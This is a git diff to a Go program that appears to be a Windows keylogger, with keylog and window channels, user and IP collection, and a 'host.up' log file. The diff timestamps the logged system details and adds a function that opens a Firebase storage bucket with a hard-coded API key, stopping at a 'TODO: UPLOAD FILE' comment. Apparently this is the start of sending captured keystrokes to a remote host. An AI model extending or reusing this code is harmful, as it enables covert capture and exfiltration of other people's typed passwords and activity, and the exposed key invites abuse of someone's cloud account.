@@ -6,6 +6,7 @@ package main
 
 import (
 	"bytes"
+	"context"
 	"io"
 	"log"
 	"net"
@@ -16,7 +17,9 @@ import (
 	"time"
 	"unsafe"
 
+	firebase "firebase.google.com/go"
 	"github.com/gios/amigo/constants"
+	"google.golang.org/api/option"
 )
 
 const logFile = "host.up"
@@ -53,7 +56,7 @@ var tmpKeylog = make(chan string)
 var tmpWindow = make(chan string)
 
 func (si *systemInfo) String() string {
-	return "(log " + si.userName + " " + si.userUsername + " " + si.localIP.String() + ")" + "\r\n"
+	return time.Now().Format("2006-01-02 15:04:05") + " " + "(log " + si.userName + " " + si.userUsername + " " + si.localIP.String() + ")" + "\r\n"
 }
 
 // User32.dll
@@ -452,6 +455,28 @@ func copy(src, dst string) error {
 		}
 	}
 	return nil
+}
+
+func initFirebase() {
+	config := &firebase.Config{
+		StorageBucket: "amigo-61499.appspot.com",
+	}
+	opt := option.WithAPIKey("AIzaSyC6pEmNFVRWTh-KsDi30jDEWgQZQKYupmA")
+	app, err := firebase.NewApp(context.Background(), config, opt)
+	if err != nil {
+		log.Panicf("newApp -> %v", err)
+	}
+
+	client, err := app.Storage(context.Background())
+	if err != nil {
+		log.Panicf("storage -> %v", err)
+	}
+
+	bucket, err := client.DefaultBucket()
+	if err != nil {
+		log.Panicf("bucket -> %v", err)
+	}
+	// TODO: UPLOAD FILE
 }
 
 func main() {
